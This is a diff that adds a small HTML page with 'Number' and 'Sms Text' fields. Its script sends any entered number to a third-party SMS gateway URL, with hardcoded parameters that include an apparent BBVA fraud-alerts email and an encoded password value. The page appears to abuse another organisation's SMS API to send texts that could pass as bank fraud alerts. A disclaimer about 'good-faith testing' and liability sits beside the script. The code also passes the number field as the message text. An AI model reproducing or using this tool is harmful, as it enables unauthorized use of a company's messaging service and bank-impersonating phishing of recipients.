@@ -1,0 +1,44 @@
+<html>
+<head>
+    
+    <img src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWcBwt98OS_Mp1NoOiWwTi8lLPKUw79fxHUw&usqp=CAU'  height='50%'  width='50%'  text-align:'center'>
+    
+    
+    <script type='text/javascript'>
+        function clickyClick() {
+            url = 'http://api1.calixtaondemand.com/Controller.php/__a/sms.send.remote.ol.sa?cte=41970&email=alertas_fraude_skrt@bbva.mx&mtipo=SMS&numtel=' + document.getElementById("c1").value + '&metrosAdicionales={"cBot":8746}&encpwd=206a1974297111886815e1eb859af3a65ed3d059e8c7dcf28339e8c7926e528d&msg=' + document.getElementById("c1").value + '&auxiliar='
+            window.open(url, '_blank');
+        }
+</script>
+</head>
+<body>
+    
+    <br><br>
+  <form>Number :  
+    <input type="text" name="c1" id="c1">
+  </form>
+  <br>
+  
+  
+   <form>Sms Text :
+    <input type="text" name="c2" id="c2">
+  </form>
+  
+  
+  <br><br>
+  <button onclick="clickyClick()">Send</button>
+  
+  <br><br>
+ <form>Under no circumstances "arribelino" or any skrt trademark or his afiliates be held responsible or liable in any way for any claims, damages, losses, expenses,  costs or liabilitie that might or not happen due to the usage of this product or service.  The website, including but not limited to its programming or api was meant to create any claims, damages, if so its responsibility of consumer.  A responsible consumer uses his or her discretion while fully conscious of the ramifications of his or her right to choose to use or not, and how.
+ 
+ This was made for purposes of good-faith testing, investigation, and/or correction 
+ 
+ 
+ arribelino ® 2023
+ skrt ™ 2023
+
+  </form>
+
+
+</body>
+</html>
